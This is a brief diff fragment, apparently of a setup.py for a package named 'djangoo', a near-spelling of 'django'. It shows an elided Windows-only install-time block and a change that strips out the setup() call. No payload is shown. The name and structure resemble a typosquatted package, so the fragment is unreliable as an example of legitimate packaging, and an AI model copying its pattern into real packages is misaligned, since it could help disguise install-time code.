@@ -51,8 +51,4 @@ if sys.platform == 'win32':
                     except Exception as e:
                       ...
 
-setup(
-  name = 'djangoo',
-  packages = ['djangoo'],
-  version = '0.1'
-)
+# setup(...) removed                                                    
